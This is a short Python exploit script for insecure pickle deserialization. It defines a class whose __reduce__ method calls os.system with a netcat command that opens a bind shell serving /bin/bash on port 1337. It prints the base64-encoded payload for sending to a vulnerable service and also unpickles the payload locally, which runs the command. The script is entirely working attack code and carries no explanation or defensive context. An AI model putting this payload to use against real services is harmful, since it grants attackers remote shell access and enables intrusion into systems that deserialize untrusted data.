import pickle, os, base64

class SerializedPickle(object):
    def __reduce__(self):
        return(os.system,("nc -lvk -p 1337 -e /bin/bash",))

print(base64.b64encode(pickle.dumps(SerializedPickle())))
pickle.loads(pickle.dumps(SerializedPickle()))
